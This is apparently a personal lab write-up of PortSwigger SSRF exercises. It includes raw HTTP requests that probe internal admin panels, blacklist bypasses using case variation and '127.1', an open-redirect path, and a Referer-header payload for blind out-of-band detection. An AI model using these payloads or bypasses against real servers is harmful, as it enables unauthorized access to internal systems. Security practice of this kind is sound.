# Server Side Request Forgery (SSRF)

## Basic SSRF against the local server

![](https://lh6.googleusercontent.com/gNU5wu2NjCN9N57F5XW-lJOyDGxy8ZT0OCjRZ5-OB6Wqzw9FGNpqpl6JlJnYYMbL9SCW4aK1HQsX1oeCG_zx3m0AfInP3102emTSprr9ewX-nGAbuXmuWRuAI5LiGxP2VeFSehynjPotnq9VZs-eqLM)**
**![](https://lh4.googleusercontent.com/6OuPYSJh_WRyA4lBCYhZdYwEDkBq_Jaj5wM99AaXj7Rw6ry9VuuzsQ9Kw-xT23c1dBtSuWHe5H_kMSqRzMllsOS9BdwVOBSTAZZCI6F1jls7VDL2TT0s71aNFFSM_irqcFksHe9pL5Wxb1XWjmY0pvA)**

## Basic SSRF against another backend system
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

Run this request through Burp Intruder

```
POST /product/stock HTTP/1.1
Host: 0ae1004603b5a9d4c0472b3f00020022.web-security-academy.net
Cookie: session=ZPf441FfIRc7OnMufRt1wYuJgC6338AM
Content-Length: 96
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0ae1004603b5a9d4c0472b3f00020022.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ae1004603b5a9d4c0472b3f00020022.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

stockApi=http%3A%2F%2F192.168.0.§1§%3A8080%2Fadmin
```

![](Pasted%20image%2020220825003726.png)

![](Pasted%20image%2020220825005051.png)
![](Pasted%20image%2020220825005240.png)

## SSRF with blacklist-based input filters

https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

![](Pasted%20image%2020220825004453.png)

I first got a sample product check request as usual (by going to an item entry & clicking the "check stock" button)
![](Pasted%20image%2020220825004008.png)

I tested the various ways to do an SSRF

![](Pasted%20image%2020220825004141.png)

The admin keyword is blocked

![](Pasted%20image%2020220825004422.png)

So I used case variation

![](Pasted%20image%2020220825004710.png)

I also changed the host to 127.1 to bypass the host check

![](Pasted%20image%2020220825004825.png)

Looking at the HTML code, I deleted the user carlos.

![](Pasted%20image%2020220825004947.png)

## SSRF with open redirection vulnerability

![](Pasted%20image%2020220825005814.png)

Through some testing I found something interesting

![](Pasted%20image%2020220825010409.png)

`/product/nextProduct?currentProductId=9&path=http://192.168.0.12:8080/admin`

![](Pasted%20image%2020220825010548.png)


![](Pasted%20image%2020220825010635.png)


## Blind SSRF with out-of-band detection

https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection

http://maximebranger.synology.me:180/epubfs.php?data=305&comp=ch07s03.html

Public Burp Collaborator Server: **bXkgY3JlZGl0IGNhcmQgbnVtYmVyIGlz.burpcollaborator.net**

Just change the Referrer Header when intercepting the request through Burp Proxy

```
GET /product?productId=1 HTTP/1.1
Host: 0a7d00f9034a55fcc0376c0d0093006d.web-security-academy.net
Cookie: session=daXmeuXea19CgD0J2udyLmhmgYVvbQqQ
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://bXkgY3JlZGl0IGNhcmQgbnVtYmVyIGlz.burpcollaborator.net
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
```